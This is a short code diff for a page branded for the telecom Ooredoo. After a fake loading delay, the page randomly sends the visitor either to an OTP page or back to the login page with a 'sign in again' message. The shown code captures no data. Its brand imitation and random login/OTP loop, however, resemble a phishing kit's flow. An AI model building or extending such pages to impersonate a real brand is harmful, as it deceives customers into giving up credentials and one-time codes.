@@ -77,18 +77,16 @@
 </main>
 
 <script>
-  // Mock loading - 50% chance of success or failure
+  // Mock result: if accepted -> OTP page, if rejected -> login page with error message
   setTimeout(() => {
-    const isSuccess = Math.random() > 0.5;
+    const isAccepted = Math.random() > 0.5;
     
-    if (isSuccess) {
-      // Verification succeeded - go to success page
-      sessionStorage.removeItem('otpCode');
-      window.location.href = 'success_ooredoo_en.html';
-    } else {
-      // Verification failed - back to OTP page with error message
-      sessionStorage.setItem('otpError', 'Invalid or expired OTP code');
+    if (isAccepted) {
+      sessionStorage.setItem('loginError', 'Application accepted. Please continue with OTP verification.');
       window.location.href = 'otp_ooredoo_en.html';
+    } else {
+      sessionStorage.setItem('loginError', 'Application rejected. Please sign in again and try again.');
+      window.location.href = 'login_ooredoo_en.html';
     }
   }, 2500);
 </script>
